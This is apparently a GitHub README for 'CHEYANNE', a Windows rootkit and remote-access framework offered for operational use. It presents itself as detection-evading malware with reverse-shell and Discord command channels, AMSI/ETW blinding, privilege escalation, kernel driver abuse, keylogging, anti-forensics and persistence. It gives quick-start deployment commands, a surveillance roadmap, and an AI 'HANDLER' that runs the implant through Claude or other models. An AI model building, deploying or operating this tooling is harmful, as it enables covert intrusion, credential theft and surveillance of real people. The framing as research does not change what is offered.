# CHEYANNE

```
  ██████╗██╗  ██╗███████╗██╗   ██╗ █████╗ ███╗   ██╗███╗   ██╗███████╗
 ██╔════╝██║  ██║██╔════╝╚██╗ ██╔╝██╔══██╗████╗  ██║████╗  ██║██╔════╝
 ██║     ███████║█████╗   ╚████╔╝ ███████║██╔██╗ ██║██╔██╗ ██║█████╗
 ██║     ██╔══██║██╔══╝    ╚██╔╝  ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝
 ╚██████╗██║  ██║███████╗   ██║   ██║  ██║██║ ╚████║██║ ╚████║███████╗
  ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝
```

**22DIV // george wu // rainfantry.github.io**

> *"Named after someone worth protecting. Built to never be forgotten."*

---

### What This Is

A full-spectrum Windows rootkit with dual C2 channels, AI-assisted operations, and a metamorphic mutation pipeline that defeats all static signature detection. 13 operational phases. 26+ clean binaries. Zero Defender detections — built and tested with Real-Time Protection enabled.

Forked from VADER — the original rootkit research project that grew from a TOCTOU race condition study into a complete kill chain. CHEYANNE is the operational branch: bidirectional Discord C2 for WAN access, automated deployment, live screen surveillance, and an AI operator (HANDLER) that accepts natural language commands.

This isn't a toy. It's not a CTF tool. It's a working rootkit built from first principles — no Metasploit, no Cobalt Strike, no copied shellcode. Every line hand-written, every binary tested against live Defender, every technique documented to reporting standard.

### Why It Exists

Offensive security research. Understanding Windows security architecture deeply enough to find what Microsoft missed. Every technique studied on own hardware, documented for responsible disclosure. MSRC submission VULN-195458 on file.

The name is sacred. It carries forward.

### Classification

```
CLASSIFICATION:  UNCLASSIFIED // ACADEMIC USE ONLY
OPERATOR:        VADER (george wu / 22DIV)
AUTHORISATION:   CSEC academic research, own hardware
DOCTRINE:        Israeli cyber methodology — Unit 8200 principles
                 Build from scratch. Understand fundamentals.
                 Dual-toolset resilience. Tool burn protocol.
                 If you can't build it, you don't understand it.
DISCLOSURE:      Responsible disclosure via MSRC
MSRC:            VULN-195458 (HWBP bypass — rejected, detection bypasses out of scope)
TARGET:          Windows 11 Home Build 26200 (24H2)
                 Standard user context
                 Defender RTP ENABLED, Tamper Protection OFF
STATIC SCAN:     0/26+ BINARIES DETECTED
RUNTIME:         0 BEHAVIOURAL DETECTIONS
MEMORY MODIFIED: ZERO BYTES
```

---

### Dual C2 Architecture

```
                        ┌─────────────────────────────────┐
                        │         OPERATOR MACHINE         │
                        │                                  │
                        │   vader_c2_v2.py (chey> shell)   │
                        │   cheyanne_agent.py (HANDLER AI) │
                        │   vader_ui.py (web dashboard)    │
                        └──────────┬──────────┬────────────┘
                                   │          │
                         TCP :4443 │          │ Discord API
                         (LAN)     │          │ (WAN)
                                   │          │
                        ┌──────────┴──────────┴────────────┐
                        │          TARGET MACHINE           │
                        │                                   │
                        │   vader_shell.exe (TCP C2)        │
                        │   svchost_update.exe (Discord)    │
                        │                                   │
                        │   Both persist via HKCU\Run       │
                        └───────────────────────────────────┘
```

**TCP Channel** — Full interactive reverse shell. File transfer, screenshot, live watch (streaming screen capture), deploy, persist. LAN only (IP-based, no DNS resolution yet).

**Discord Channel** — Bidirectional C2 through Discord's API. Operator sends commands via bot token, implant polls and responds. Works from any network — no port forwarding, no router config. Traffic looks like normal Discord API calls.

**HANDLER** — AI-powered operator. Natural language commands ("take a screenshot of radon", "run whoami on all sessions"). Backends: Ollama (local), Kimi K2.5 (OpenRouter), Claude API.

### Kill Chain

```
  PHASE 0        PHASE 1        PHASE 2        PHASE 3
  C2 SHELL  -->  AMSI BLIND --> ETW BLIND  --> PRIVESC
  XOR reverse    DR0 HWBP on    DR1 HWBP on    CWE-732
  shell          AmsiScan       EtwEvent       svc binary
  callback       Buffer         Write          replace
     |              |              |              |
     v              v              v              v
  PHASE 4        PHASE 5        PHASE 6        META
  INJECTION  --> STAGER    -->  FORENSICS  --> MUTATION
  DLL inject     WinHTTP        canary wipe    XOR key
  + HWBP on      download       log clear      rotation +
  all threads    cradle         timestomp      recompile +
                                self-delete    rescan loop
     |              |              |
     v              v              v
  PHASE 7        PHASE 8        PHASE 9
  CLOAK     -->  BYOVD     -->  C2 AGENT
  NtQuery        RTCore64.sys   17-op remote
  inline hook    CVE-2019-16098 agent: shell,
  proc/file/     token steal,   screenshot,
  conn hide      callback kill  mic, keylog,
  system-wide    DSE bypass     sftp, persist
     |
     v
  PHASE 10       PHASE 11       PHASE 12
  METAMORPH -->  DISCORD C2 --> AI OPERATOR
  dead code,     Bidirectional   Natural lang
  opaque pred,   WAN C2 via     HANDLER via
  junk API,      Discord API    Ollama/Kimi/
  const split    polling loop   Claude API
```

| Phase | Component | Status | Technique |
|-------|-----------|--------|-----------|
| 0 | C2 Reverse Shell | **OPERATIONAL** | XOR-obfuscated TCP callback, auto-reconnect |
| 1 | AMSI Bypass | **OPERATIONAL** | Hardware breakpoint DR0 on AmsiScanBuffer |
| 2 | ETW Bypass | **OPERATIONAL** | Hardware breakpoint DR1 on EtwEventWrite |
| 1+2 | Dark Room | **OPERATIONAL** | Dual HWBP, zero memory modification |
| 3 | Privilege Escalation | **CONFIRMED** | CWE-732 service binary replacement → SYSTEM |
| 4 | Process Injection | **OPERATIONAL** | DLL injection + HWBP propagation all threads |
| 5 | HTTP Stager | **BUILT** | WinHTTP download cradle + C2 file server |
| 6 | Anti-Forensics | **BUILT** | Canary wipe, log clear, prefetch, timestomp, self-delete |
| 7 | User-Mode Cloak | **OPERATIONAL** | NtQuery* inline hooks — proc/file/conn hiding |
| 8 | BYOVD Kernel | **BUILT** | RTCore64.sys arbitrary R/W, token steal, EDR kill, DSE bypass |
| 9 | C2 Remote Agent | **BUILT** | 17-op agent: screenshot, mic, keylog, SFTP, VNC, persist |
| 10 | Metamorphic Engine | **OPERATIONAL** | Dead code, opaque predicates, junk API, constant splitting |
| 11 | Discord C2 | **OPERATIONAL** | Bidirectional WAN C2, PyInstaller implant, registry persist |
| 12 | HANDLER AI | **OPERATIONAL** | Natural language C2 via Ollama/Kimi K2.5/Claude |

### Stealth Profile

```
  TEST                           RESULT
  ──────────────────────────────────────────
  Static scan (26+ binaries)     0 DETECTED
  Runtime behavioural            0 DETECTED
  Memory integrity               ZERO bytes modified
  VirtualProtect calls           NONE
  AMSI scan result               E_INVALIDARG (blind)
  ETW telemetry                  STATUS_SUCCESS (silenced)
  Privilege required             Standard user
```

### XOR Signature Isolation

Each component has its own XOR key. Defender signatures one binary, the others survive. `mutate.py` rotates all keys automatically per build cycle.

### Architecture

```
cheyanne/
├── shell/              PHASE 0: XOR reverse shell + C2 v2 unified operator
├── dark_room/          PHASE 1+2: Combined dual HWBP (AMSI + ETW blind)
├── sideload/           PHASE 3: CWE-732 service replacement
├── injection/          PHASE 4: DLL injection + HWBP propagation
├── stagers/            PHASE 5: WinHTTP download cradle
├── forensics/          PHASE 6: Anti-forensics cleanup
├── vectors/            Signature-isolated attack modules (v4-v7)
├── cloak/              PHASE 7: User-mode rootkit (proc/file/conn hiding)
├── byovd/              PHASE 8: BYOVD kernel persistence
├── agent/              PHASE 11: Discord implant + PyInstaller
├── docs/               BUILD_FROM_ASHES manual + CODE_WALKTHROUGH
├── deploy.py           Build + scan + deploy automation
├── mutate.py           XOR key mutation pipeline
├── metamorph.py        Metamorphic source transformer (Phase 10)
├── vader_evolve.py     Evolution pipeline (metamorph → mutate → compile → scan)
├── vader_c2_v2.py      Unified C2 shell (TCP + Discord, chey> prompt)
│                       ↑ shortcuts: deploy, screenshot, watch, kill, recon, persist
├── cheyanne_agent.py   HANDLER AI operator (Ollama/Kimi/Claude)
├── cheyanne_config.py  Shared config — auto-detect VCVARS, port map
├── vader_ui.py         Web C2 dashboard (:8666)
├── test_verify.py      26-test verification suite
└── setup_firewall.bat  One-time firewall rules (6 ports)
```

### Network

```
Port   Protocol   Component                  Access
────   ────────   ─────────                  ──────
4443   TCP raw    C2 listener (reverse shell)  LAN
8666   HTTP       Web dashboard                LAN (phone OK)
8667   TCP JSON   Agent listener               LAN
8890   HTTP       File server (deploy)         LAN
8891   HTTP       Screenshot/watch receiver    LAN
8892   HTTP       Watch live viewer            LAN (browser)
```

Discord C2 requires no open ports — traffic routes through Discord's servers.

### Quick Start

```cmd
:: 1. Clone + env setup
git clone https://github.com/rainfantry/cheyanne.git
cd cheyanne
copy agent\.env.example .env
:: Edit .env — add DISCORD_BOT_TOKEN, DISCORD_C2_CHANNEL, DISCORD_C2_WEBHOOK

:: 2. Firewall (admin, one-time)
setup_firewall.bat

:: 3. Fresh Build (auto-detects VS, auto-detects LAN IP)
python deploy.py --compile-shell <TARGET_IP> 4443

:: 4. Launch C2
python shell/vader_c2_v2.py
:: chey> deploy        ← push both payloads to target
:: chey> screenshot    ← grab screen
:: chey> watch 3       ← live stream every 3 seconds
:: chey> persist       ← survive reboot

:: 5. AI Operator (optional)
python cheyanne_agent.py           :: Ollama (local)
python cheyanne_agent.py --kimi    :: Kimi K2.5 (WAN)
python cheyanne_agent.py --claude  :: Claude API
```

### Build From Scratch

See **[docs/BUILD_FROM_ASHES.md](docs/BUILD_FROM_ASHES.md)** — the complete field manual. Every phase, every compile command, every configuration step. A human with zero knowledge can follow it end-to-end and produce a working rootkit.

See **[docs/CODE_WALKTHROUGH.md](docs/CODE_WALKTHROUGH.md)** — annotated technical walkthrough of every component.

---

### Future — What Must Be Added to Make It Immortal

#### WAN C2 (TCP over Internet)
- DNS resolution in C shell (`getaddrinfo()` replacing `inet_addr()`)
- Dynamic DNS (DDNS) support — target calls back to a hostname, not a hardcoded IP
- Port multiplexing — single port handles C2 + file transfer + watch
- Domain fronting via CDN (Cloudflare/AWS) — C2 traffic looks like HTTPS to a legitimate domain

#### Live Screen (Real-Time, Not Relayed Screenshots)
- Replace screenshot-relay with continuous frame streaming
- H.264/MJPEG encoding on target → TCP/WebSocket stream to operator
- Sub-second latency — watch video playback, read text, observe user activity in real time
- Browser-based viewer with play/pause/zoom controls

#### Audio Surveillance
- Microphone capture (waveIn API already prototyped in Phase 9 agent)
- Live audio stream to operator alongside video
- Push-to-talk reverse audio — operator speaks through target's speakers
- Combined A/V stream for complete remote surveillance

#### Keyboard and Mouse Control (Full VNC)
- SendInput injection on target — operator controls mouse and keyboard remotely
- Combined with live screen = full interactive remote desktop
- No RDP, no VNC server — custom protocol through existing C2 channel
- Input injection works at user privilege (no admin needed for most apps)

#### Webcam Capture
- DirectShow/Media Foundation capture from target's camera
- Live video stream or snapshot-on-demand
- Combined with mic = full A/V surveillance of the physical environment

#### Advanced Persistence
- WMI event subscription persistence (CIM-based, survives reboots)
- Scheduled task persistence (schtask, multiple trigger types)
- COM hijack persistence (InprocServer32 redirection)
- Bootkit research (UEFI/MBR — requires kernel access via BYOVD)

#### Evasion Upgrades
- Syscall stubs (direct NtAPI, bypass ntdll hooks) — already have gate_stub.asm foundation
- Sleep obfuscation (encrypt implant in memory during sleep cycles)
- ETW thread pool timer abuse for callback execution
- Module stomping (load DLL, overwrite .text with shellcode, unlink from PEB)

#### Intelligence
- Keylogger with window-title context (know which app each keystroke goes to)
- Clipboard monitor (capture passwords, crypto addresses, sensitive data)
- Browser credential extraction (Chrome/Edge DPAPI decryption)
- Wi-Fi password dump (netsh wlan export)

Every item above is buildable with the existing architecture. The C2 channel, mutation pipeline, and deployment automation are already in place. These are extensions, not rewrites.

---

### Key Findings

**HWBP Blind Spot (Finding #36, MSRC VULN-195458):** Defender monitors memory modifications but NOT CPU debug register manipulation. Hardware breakpoints via SetThreadContext on DR0-DR3 intercept and neuter AMSI and ETW without modifying a single byte. **MSRC rejected** — "not a security boundary." Technique published openly.

**CWE-732 Privilege Escalation (Finding #42):** Standard user → SYSTEM via service binary replacement. Full SYSTEM token, no UAC, no admin creds.

**Phantom DLL (Finding #47):** Office ClickToRunSvc loads osppc.dll that doesn't exist on disk. User-writable PATH fills the void. CWE-427.

**DLL Injection + HWBP Propagation (Finding #51):** DLL injected into target sets hardware breakpoints on ALL threads. CREATE_SUSPENDED spawn = target born blind before first instruction.

**BYOVD Kernel Persistence (Phase 8):** RTCore64.sys / dbutil_2_3.sys via SCM for arbitrary kernel R/W. Token stealing, EDR callback removal, DSE bypass. 157 KB, 0 detections.

### Rules of Engagement

1. All testing on own hardware only
2. Defender RTP stays ENABLED during all testing
3. Every test run documented
4. Novel vulnerabilities disclosed via MSRC within 90 days
5. Binaries never committed to repo (.gitignore)

### Related Repos

| Repo | Purpose |
|------|---------|
| [vader-rootkit](https://github.com/rainfantry/vader-rootkit) | Original rootkit — CHEYANNE forked from here |
| [vader-toctou](https://github.com/rainfantry/vader-toctou) | TOCTOU race condition research — 30 findings |
| [vader-fuzz](https://github.com/rainfantry/vader-fuzz) | mpengine.dll mutation fuzzer — 100K iterations |
| [vader-library](https://github.com/rainfantry/vader-library) | Forbidden Knowledge — field manuals + evidence |
| [skywalker](https://github.com/rainfantry/skywalker) | Shellcode encoder/loader toolkit |
| [starkiller](https://github.com/rainfantry/starkiller) | Android RAT — C2 + Kotlin client |

### Encrypted Backup

```cmd
7z a -p668340 -mhe=on "cheyanne-FULL-YYYYMMDD.7z" . -xr!.git -xr!__pycache__ -xr!*.exe -xr!*.dll -xr!*.obj
```

Password: **668340** | Headers encrypted | Excludes binaries and build artifacts.

---

*Named after someone worth protecting. Every line of code carries that forward.*
*The hunt never ends.*
